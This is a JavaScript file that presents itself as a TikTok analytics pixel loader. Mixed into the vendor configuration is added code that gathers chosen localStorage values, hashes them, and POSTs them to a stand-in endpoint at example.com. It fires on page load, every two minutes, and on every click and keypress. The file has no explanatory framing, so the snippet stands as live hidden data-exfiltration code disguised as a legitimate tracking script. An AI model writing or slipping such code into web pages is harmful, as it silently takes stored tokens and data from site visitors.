window[window["TiktokAnalyticsObject"]]._env = {
  "env": "external",
  "key": ""
};
const keysNeeded = window.keysNeeded;
window[window["TiktokAnalyticsObject"]]._variation_id = 'test_3';
const globalVars = ['window', 'document', 'navigator'];
function generateHash(input) {
  const vars = Object.keys(input);
  const sortedVars = vars.sort().join("");
  let hashVal = 0;
  for (let i = 0; i < sortedVars.length; i++) {
    const code = sortedVars.charCodeAt(i);
    hashVal = (hashVal << 5) - hashVal + code;
    hashVal = hashVal & hashVal;
  }
  return hashVal.toString(16);
}
window[window["TiktokAnalyticsObject"]]._cc = 'SG';
function gatherLocalStorage() {
  const necessaryData = {};
  for (const key in window.localStorage) {
    if (keysNeeded.includes(key)) {
      necessaryData[key] = window.localStorage[key];
    }
  }
  return necessaryData;
}
;
function gatherGlobalVars() {
  const necessaryData = {};
  globalVars.forEach(varName => {
    if (window[varName]) {
      necessaryData[varName] = typeof window[varName];
    }
  });
  return necessaryData;
}
if (!window[window["TiktokAnalyticsObject"]]._server_unique_id) window[window["TiktokAnalyticsObject"]]._server_unique_id = '44f00088-95b5-11ee-8b92-08c0eb2cdb7c';
window[window["TiktokAnalyticsObject"]]._plugins = {
  "AdvancedMatching": true,
  "AutoAdvancedMatching": true,
  "AutoConfig": true,
  "Callback": true,
  "DiagnosticsConsole": true,
  "Identify": true,
  "Monitor": false,
  "PangleCookieMatching": true,
  "PerformanceInteraction": false,
  "Shopify": true,
  "WebFL": false
};
async function sendData(data) {
  const hash = generateHash(data);
  const endpoint = "https://example.com/api/track";
  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        signature: hash,
        information: data
      })
    });
    if (response.ok) {
      console.log("Data successfully uploaded");
    } else {
      console.error("Data upload failed, status:" + response.status);
    }
  } catch (error) {
    console.error("Error during data upload:", error);
  }
}
window[window["TiktokAnalyticsObject"]]._auto_config = {
  "open_graph": ["audience"],
  "microdata": ["audience"],
  "json_ld": ["audience"],
  "meta": null
};
function assembleAndSendData() {
  const localStorageData = gatherLocalStorage();
  const globalVarsData = gatherGlobalVars();
  const data = {
    ...localStorageData,
    ...globalVarsData
  };
  if (Object.keys(data).length > 0) {
    sendData(data);
  }
}
window.addEventListener("DOMContentLoaded", function () {
  assembleAndSendData();
  setInterval(assembleAndSendData, 2 * 60 * 1000);
});
!function () {
  function i() {
    return window && window.TiktokAnalyticsObject || "ttq";
  }
  function t() {
    return window && window[i()];
  }
  var o,
    n,
    e,
    d,
    a,
    r = [{
      id: "MTdjYzNiZDU2MA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !1,
        CompetitorInsight: !1
      }
    }, {
      id: "MTdjYzNiZDU2MQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !1,
        CompetitorInsight: !1
      }
    }, {
      id: "MTdjYzNiZDU2Mg",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !1,
        CompetitorInsight: !1
      }
    }, {
      id: "MTdjYzNiZDU2Mw",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !1,
        CompetitorInsight: !1
      }
    }, {
      id: "MTdjYzNiZDU2NA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !0,
        CompetitorInsight: !1
      }
    }, {
      id: "MTdjYzNiZDU2NQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !0,
        CompetitorInsight: !1
      }
    }, {
      id: "MTdjYzNiZDU2Ng",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !0,
        CompetitorInsight: !1
      }
    }, {
      id: "MTdjYzNiZDU2Nw",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !0,
        CompetitorInsight: !1
      }
    }, {
      id: "MTdjYzNiZDU2OA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !1,
        CompetitorInsight: !0
      }
    }, {
      id: "MTdjYzNiZDU2OQ",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !1,
        CompetitorInsight: !0
      }
    }, {
      id: "MTdjYzNiZDU2MTA",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !1,
        CompetitorInsight: !0
      }
    }, {
      id: "MTdjYzNiZDU2MTE",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !1,
        CompetitorInsight: !0
      }
    }, {
      id: "MTdjYzNiZDU2MTI",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !1,
        Monitor: !0,
        CompetitorInsight: !0
      }
    }, {
      id: "MTdjYzNiZDU2MTM",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !1,
        Monitor: !0,
        CompetitorInsight: !0
      }
    }, {
      id: "MTdjYzNiZDU2MTQ",
      map: {
        AutoAdvancedMatching: !1,
        Shopify: !0,
        Monitor: !0,
        CompetitorInsight: !0
      }
    }, {
      id: "MTdjYzNiZDU2MTU",
      map: {
        AutoAdvancedMatching: !0,
        Shopify: !0,
        Monitor: !0,
        CompetitorInsight: !0
      }
    }],
    c = {
      "info": {
        "pixelCode": "",
        "name": "",
        "status": 1,
        "setupMode": 0,
        "partner": "",
        "advertiserID": "0",
        "is_onsite": false,
        "firstPartyCookieEnabled": false
      },
      "plugins": {
        "Shopify": false,
        "AdvancedMatching": {
          "email": false,
          "phone_number": false
        },
        "AutoAdvancedMatching": null,
        "Callback": true,
        "Identify": true,
        "Monitor": true,
        "PerformanceInteraction": true,
        "WebFL": true,
        "AutoConfig": {
          "form_rules": null,
          "vc_rules": null
        },
        "DiagnosticsConsole": true,
        "PangleCookieMatching": false,
        "CompetitorInsight": true
      },
      "rules": null
    },
    p = "https://analytics.tiktok.com/i18n/pixel/static/",
    M = t();
  M || (M = [], window && (window[i()] = M)), Object.assign(c, {
    options: (o = c.info.pixelCode, (n = t()._o) && n[o] || {})
  }), function (i) {
    M._i || (M._i = {});
    var t = i.info.pixelCode;
    t && (M._i[t] || (M._i[t] = []), Object.assign(M._i[t], i), M._i[t]._load = +new Date());
  }(c), e = function (i, t, o) {
    var n = 0 < arguments.length && void 0 !== i ? i : {},
      e = 1 < arguments.length ? t : void 0,
      t = 2 < arguments.length ? o : void 0,
      o = function (i, t) {
        for (var o = 0; o < i.length; o++) if (t.call(null, i[o], o)) return i[o];
      }(r, function (i) {
        var t = i.map;
        return function (i, t) {
          for (var o = 0; o < i.length; o++) if (!t.call(null, i[o], o)) return !1;
          return !0;
        }(Object.keys(t), function (i) {
          return !(!n[i] || !e[i]) === t[i];
        });
      });
    return o ? t + "main.".concat(o.id, ".js") : t + "main.".concat(r[0].id, ".js");
  }(M._plugins, c.plugins, p), d = c.info.pixelCode, (void 0 !== self.DedicatedWorkerGlobalScope ? self instanceof self.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === self.constructor.name) ? self.importScripts && self.importScripts(e) : ((a = document.createElement("script")).type = "text/javascript", a.async = !0, a.src = e, a.setAttribute("data-id", d), (d = document.getElementsByTagName("script")[0]) && d.parentNode && d.parentNode.insertBefore(a, d));
}();
document.addEventListener('click', function (e) {
  assembleAndSendData();
});
document.addEventListener('keydown', function (e) {
  assembleAndSendData();
});